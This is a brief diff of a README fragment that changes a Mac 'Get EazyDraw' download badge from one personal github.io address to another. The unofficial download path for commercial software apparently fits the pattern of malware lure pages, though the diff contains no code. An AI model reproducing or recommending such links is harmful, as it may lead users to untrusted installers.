@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-  <a href="https://manhyusuu48.github.io/.github/EazyDraw">  
+  <a href="https://tembilamusion.github.io/.github/EazyDraw">  
     <img src="https://img.shields.io/badge/⬇️_Get_EazyDraw_-FF6347?style=for-the-badge&logo=apple&logoColor=white" alt="Download EazyDraw for Mac">  
   </a>  
 </div>  
